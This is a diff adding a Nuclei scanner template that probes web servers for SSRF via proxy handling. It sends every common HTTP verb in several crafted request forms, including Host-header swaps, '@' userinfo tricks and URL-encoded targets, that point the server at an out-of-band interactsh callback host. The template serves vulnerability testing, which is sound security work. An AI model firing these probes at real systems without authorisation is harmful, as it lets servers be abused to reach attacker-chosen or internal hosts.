@@ -1,0 +1,56 @@
+id: ssrf-by-proxy
+
+info:
+  name: SSRF via Proxy
+  author: geeknik
+  severity: info
+
+requests:
+  - payloads:
+      verb:
+        - GET
+        - HEAD
+        - POST
+        - PUT
+        - DELETE
+        - CONNECT
+        - OPTIONS
+        - TRACE
+        - PATCH
+
+    raw:
+      - |
+        {{verb}} http://{{interactsh-url}}/#{{verb}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        {{verb}} {{BaseURL}}/#{{verb}} HTTP/1.1
+        Host: {{interactsh-url}}
+
+      - |
+        {{verb}} /http://{{interactsh-url}}/#{{verb}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        {{verb}} /{{BaseURL}}@{{interactsh-url}}/#{{verb}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        {{verb}} http%3A%2F%2F{{interactsh-url}}%2F%23{{verb}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        {{verb}} /http%3A%2F%2F{{interactsh-url}}%2F%23{{verb}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        {{verb}} /{{url_encode('{{BaseURL}}@{{interactsh-url}}/#{{verb}}')}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
